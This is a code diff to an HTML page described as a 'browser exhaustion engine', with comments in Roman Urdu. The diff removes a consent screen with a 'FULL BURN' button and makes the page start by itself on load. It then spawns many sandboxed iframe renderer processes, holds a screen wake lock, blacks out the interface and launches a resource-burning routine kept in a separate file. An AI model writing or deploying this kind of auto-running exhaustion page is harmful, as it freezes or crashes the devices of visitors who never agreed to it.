@@ -8,7 +8,7 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
 <meta name="mobile-web-app-capable" content="yes" />
 <meta name="description" content="Dark Empire Engine — browser exhaustion engine" />
-<title>DARK EMPIRE ENGINE BY Sardar DauD Arain</title>
+<title>DARK EMPIRE ENGINE</title>
 <style>
 :root{ --g:#39ff14; --dim:#0b2b06; }
 *{ box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
@@ -39,28 +39,12 @@ canvas.dee{ position:fixed; inset:0; width:100%; height:100%; z-index:0; opacity
   z-index:45; width:44px; height:44px; border-radius:2px;
   background:rgba(0,0,0,.4); color:var(--g); border:1px solid rgba(57,255,20,.5);
   font:10px/1 ui-monospace,monospace; font-weight:700; letter-spacing:.1em;
-  display:none; align-items:center; justify-content:center; cursor:pointer;
+  display:flex; align-items:center; justify-content:center; cursor:pointer;
 }
-body.live #stop{ display:flex; }
 body.black #stop{ opacity:.18; }
 body.black #hud, body.black canvas.dee, body.black #domhost, body.black #realms{ visibility:hidden; }
 #shade{ position:fixed; inset:0; z-index:40; background:#000; opacity:0; transition:opacity 1.2s linear; pointer-events:none; }
 body.black #shade{ opacity:1; }
-#boot{
-  position:fixed; inset:0; z-index:50; background:#000; display:flex;
-  flex-direction:column; align-items:center; justify-content:center;
-  gap:16px; text-align:center; padding:24px;
-}
-#boot h1{ margin:0; font-size:15px; letter-spacing:.3em; font-weight:700; }
-#boot p{ margin:0; opacity:.5; max-width:290px; line-height:1.7; }
-#boot small{ opacity:.35; letter-spacing:.08em; }
-#boot .btns{ display:flex; gap:10px; margin-top:4px; }
-#boot button{
-  background:#000; color:var(--g); border:1px solid var(--g); border-radius:2px;
-  padding:12px 20px; font:inherit; font-weight:700; letter-spacing:.16em;
-  text-transform:uppercase; cursor:pointer; box-shadow:0 0 18px rgba(57,255,20,.2);
-}
-#boot button:active{ background:var(--g); color:#000; }
 </style>
 </head>
 <body>
@@ -83,13 +67,6 @@ body.black #shade{ opacity:1; }
 
 <button id="stop" aria-label="stop">STOP</button>
 <div id="shade"></div>
-
-<div id="boot">
-  <h1>DARK EMPIRE ENGINE</h1>
-  <p>Auto-tier detect hoga. Har sandboxed realm apna alag renderer process hai.</p>
-  <small id="det">detect…</small>
-  <div class="btns"><button id="go">FULL BURN</button></div>
-</div>
 
 <script src="core.js"></script>
 <script>
@@ -132,7 +109,7 @@ function spawnRealms(n) {
       host.appendChild(f);
       realms++;
       paint();
-    }, 900 + i * 700);          /* staggered — ek saath crash na ho */
+    }, 900 + i * 700);
   }
 }
 
@@ -155,24 +132,21 @@ function measure() {
   })();
 }
 
-el('det').textContent =
-  'cores ' + (navigator.hardwareConcurrency || '?') +
-  ' · ram ' + (navigator.deviceMemory || '?') + ' GB · tier T' + DEE.T;
+el('det') && (el('det').textContent = '');
 
-el('go').addEventListener('click', () => {
-  el('boot').remove();
+/* ---------- auto start, koi button nahi ---------- */
+function start() {
   document.body.classList.add('live');
   try { navigator.wakeLock?.request('screen'); } catch (e) {}
 
-  paint();                        /* pehle HUD, phir kaam */
+  paint();
   spawnRealms(DEE.P.realms);
   setInterval(paint, 200);
   setTimeout(blackout, BLACK_MS);
   setTimeout(measure, 15000);
 
-  /* do frame do — burst se pehle paint ho jaye */
-  requestAnimationFrame(() => requestAnimationFrame(() => DEE.run()));
-});
+  DEE.run();
+}
 
 el('stop').addEventListener('click', (e) => {
   e.stopPropagation();
@@ -180,7 +154,9 @@ el('stop').addEventListener('click', (e) => {
   log('STOPPED');
 });
 
+/* pehle frame paint ho jaye, phir burst */
 paint();
+requestAnimationFrame(() => requestAnimationFrame(() => setTimeout(start, 80)));
 </script>
 </body>
   </html>
